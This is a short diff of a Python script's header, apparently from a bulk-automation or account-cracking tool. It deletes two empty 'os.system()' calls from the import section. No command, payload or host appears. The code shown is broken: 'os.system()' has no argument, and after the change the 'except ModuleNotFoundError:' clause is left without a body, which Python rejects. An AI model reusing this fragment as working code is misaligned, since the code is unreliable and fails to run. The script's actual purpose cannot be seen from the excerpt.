@@ -4,14 +4,12 @@
 #-------------------[ MAIN-CODE ]-------------------#
 from os import path
 import requests,os
-os.system()
 import os,base64,zlib,pip,urllib
 try:
         import os,requests,json,time,re,random,sys,uuid,string,subprocess
         from string import *
         from concurrent.futures import ThreadPoolExecutor as tred
 except ModuleNotFoundError:
-        os.system()
 except:pass
 class jalan:
     def __init__(self, z):
